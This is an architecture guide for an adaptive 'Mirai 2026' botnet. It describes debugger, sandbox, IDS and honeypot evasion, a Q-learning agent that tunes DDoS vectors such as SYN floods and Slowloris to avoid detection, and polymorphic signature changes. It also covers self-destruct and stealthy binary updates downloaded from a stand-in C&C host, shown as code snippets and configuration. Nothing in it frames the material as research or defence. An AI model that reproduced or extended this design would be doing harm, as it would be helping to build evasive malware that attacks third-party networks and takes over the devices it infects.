# Self-Improving Bot System - Architecture Guide

## Overview

The Mirai 2026 bot includes a sophisticated self-improvement system that adapts to detection and learns from experience. This document explains the architecture and mechanisms.

## Components

### 1. Detection Engine (`src/evasion/detection_engine.c`)

**Purpose**: Detect when the bot is being analyzed or blocked

**Detection Methods**:
- **Debugger Detection**: ptrace, TracerPid checks, timing analysis
- **Sandbox Detection**: VM artifacts, low uptime, suspicious usernames
- **IDS/IPS Detection**: Packet drop rate analysis
- **Honeypot Detection**: Response timing, open port analysis

**Response Strategies**:
- Change behavior patterns
- Modify network signatures
- Go dormant temporarily
- Request binary update
- Self-destruct (extreme cases)

### 2. Reinforcement Learning Agent (`ai/reinforcement_learning/adaptive_agent.py`)

**Purpose**: Learn optimal attack strategies through trial and error

**State Space**:
- Detection rate (0.0 - 1.0)
- Success rate (0.0 - 1.0)
- Active connections
- Packets sent per second
- Bandwidth utilization
- Time since last detection
- Target response time
- Honeypot suspicion

**Action Space**:
- Attack vector selection (TCP SYN, UDP, HTTP, Slowloris, etc.)
- Intensity level (0.0 - 1.0)
- Scan rate
- Evasion level (0-3)
- Signature change
- Dormancy trigger

**Reward Function**:
```
Reward = +100 * (success_rate_delta)
         -200 * (detection_rate_delta)
         +20  * (high_success_low_detection_bonus)
         -100 * (honeypot_penalty)
         +5   * (evasion_time_bonus)
```

**Learning Algorithm**: Q-Learning
- Q(s,a) = Q(s,a) + α[r + γ·max(Q(s',a')) - Q(s,a)]
- Learning rate (α): 0.1
- Discount factor (γ): 0.95
- Exploration rate (ε): 0.2

### 3. Self-Update System (`src/update/self_update.c`)

**Purpose**: Securely update bot binary when detected

**Features**:
- Cryptographic signature verification (Ed25519)
- Automatic rollback on failure
- Differential updates (future)
- Hot-patching (future)

**Update Flow**:
```
1. Check C&C for updates
2. Download new binary
3. Verify signature
4. Backup current binary
5. Replace binary
6. Restart (if needed)
7. Rollback on failure
```

## Self-Improvement Loop

```
┌─────────────────────────────────────────────────┐
│                   BOT RUNTIME                    │
│                                                  │
│  ┌──────────────┐    ┌─────────────────┐        │
│  │  Operations  │───▶│ Detection Engine │        │
│  │  (Attack,    │    │  - Debugger      │        │
│  │   Scan)      │    │  - Sandbox       │        │
│  └──────────────┘    │  - IDS/IPS       │        │
│         │             └─────────────────┘        │
│         │                      │                 │
│         │                      ▼                 │
│         │              Detection Event?          │
│         │                      │                 │
│         │             ┌────────┴────────┐        │
│         │             │                 │        │
│         │        YES  │            NO   │        │
│         │             ▼                 │        │
│         │     ┌──────────────┐          │        │
│         │     │ Evasion      │          │        │
│         │     │ Strategy     │          │        │
│         │     │ Selection    │          │        │
│         │     └──────┬───────┘          │        │
│         │            │                  │        │
│         │            ▼                  │        │
│         │     ┌──────────────┐          │        │
│         │     │ Apply:       │          │        │
│         │     │ - Change sig │          │        │
│         │     │ - Go dormant │          │        │
│         │     │ - Update bin │          │        │
│         │     └──────────────┘          │        │
│         │                                │        │
│         └────────────────────────────────┘        │
│                        │                          │
│                        ▼                          │
│              ┌──────────────────┐                 │
│              │ RL Agent         │                 │
│              │ (Learn from      │                 │
│              │  experience)     │                 │
│              └──────────────────┘                 │
│                        │                          │
│                        ▼                          │
│              ┌──────────────────┐                 │
│              │ Update Q-table   │                 │
│              │ Improve policy   │                 │
│              └──────────────────┘                 │
└─────────────────────────────────────────────────┘
                        │
                        ▼
              Report to C&C for
              Global Intelligence
```

## Detection → Response Matrix

| Detection Type | Confidence | Response Action |
|----------------|-----------|-----------------|
| Debugger | High | Go dormant 1hr |
| Debugger + Sandbox | Critical | Self-destruct |
| IDS/IPS | Medium | Change signature + timing |
| Honeypot | High | Blacklist IP, change target |
| Rate Limiting | Low | Reduce scan rate |
| Multiple Critical | Critical | Request binary update |

## Learning Examples

### Scenario 1: IDS Detection
```
Initial State:
- detection_rate: 0.1
- success_rate: 0.6
- attack_vector: tcp_syn

Action Taken:
- attack_vector: tcp_syn
- intensity: 0.9
- evasion_level: 0

Next State:
- detection_rate: 0.4 (increased!)
- success_rate: 0.7

Reward: -60 (detection penalty)

Learning: High intensity TCP SYN with no evasion → bad
Next time: Use lower intensity or add evasion
```

### Scenario 2: Successful Evasion
```
Initial State:
- detection_rate: 0.3
- success_rate: 0.5

Action Taken:
- attack_vector: slowloris
- intensity: 0.6
- evasion_level: 2
- change_signature: true

Next State:
- detection_rate: 0.1 (decreased!)
- success_rate: 0.7 (increased!)

Reward: +140 (success + low detection bonus)

Learning: Slowloris with evasion → good
Next time: Prefer this strategy in similar states
```

## Binary Update Process

### 1. Detection Triggers Update
```c
if (critical_detections >= 2) {
    strategy->request_update = true;
}
```

### 2. C&C Provides New Binary
```json
{
  "update_available": true,
  "version": "2.0.1-polymorphic-abc123",
  "binary_size": 245760,
  "download_url": "https://cnc.example.com/updates/bot-v2.0.1.bin",
  "signature": "ed25519_signature_here",
  "method": "full"
}
```

### 3. Bot Downloads & Verifies
```c
update_download(ctx, &metadata, "/tmp/.update.bin");
if (update_verify_signature(ctx, "/tmp/.update.bin", metadata.signature)) {
    update_apply(ctx, "/tmp/.update.bin", UPDATE_METHOD_FULL);
}
```

### 4. New Binary Runs with Different Signatures
- Different compiler flags
- Code reordering
- Different obfuscation
- New network fingerprint

## Polymorphic Transformations

### Network Signature Changes
```c
polymorphic_change_network_signature() {
    // Modify:
    - TTL values (randomize 32-128)
    - TCP window sizes
    - Packet sizes
    - Inter-packet timing
    - TCP options order
    - Source port strategy
}
```

### Behavior Changes
```c
polymorphic_change_behavior() {
    // Modify:
    - Scan rate (±30%)
    - Target selection algorithm
    - Attack duration
    - Sleep intervals
    - Connection pool size
}
```

## Metrics & Monitoring

All self-improvement actions are tracked:

```
mirai_bot_detections_total{type="debugger"}
mirai_bot_detections_total{type="sandbox"}
mirai_bot_detections_total{type="ids_ips"}
mirai_bot_evasion_actions_total
mirai_bot_signature_changes_total
mirai_bot_behavior_changes_total
mirai_bot_binary_updates_total
mirai_ai_agent_reward_total
mirai_ai_agent_episodes_total
```

## Configuration

Enable self-improvement in `config/bot.json`:
```json
{
  "self_improvement": {
    "enabled": true,
    "detection_engine": {
      "check_debugger": true,
      "check_sandbox": true,
      "check_ids": true
    },
    "rl_agent": {
      "enabled": true,
      "learning_rate": 0.1,
      "exploration_rate": 0.2
    },
    "auto_update": {
      "enabled": true,
      "check_interval_seconds": 3600,
      "cnc_url": "https://cnc.example.com",
      "public_key_path": "/etc/mirai/update_key.pub"
    }
  }
}
```

## Security Considerations

1. **Signature Verification**: All updates MUST be signed with Ed25519
2. **Rollback**: Always backup before update
3. **Stealth**: Updates happen during low-activity periods
4. **Anti-Analysis**: Detect debugging/analysis before updating

## Testing

Test the self-improvement system:

```bash
# Test detection engine
./test_detection_engine

# Test RL agent
python ai/reinforcement_learning/adaptive_agent.py

# Test update system (requires mock C&C)
./test_self_update
```

## Future Enhancements

- [ ] Differential/incremental updates (bsdiff)
- [ ] Hot-patching without restart
- [ ] Federated learning (share Q-tables across bots)
- [ ] Advanced polymorphism (code mutation)
- [ ] AI-generated exploit variants
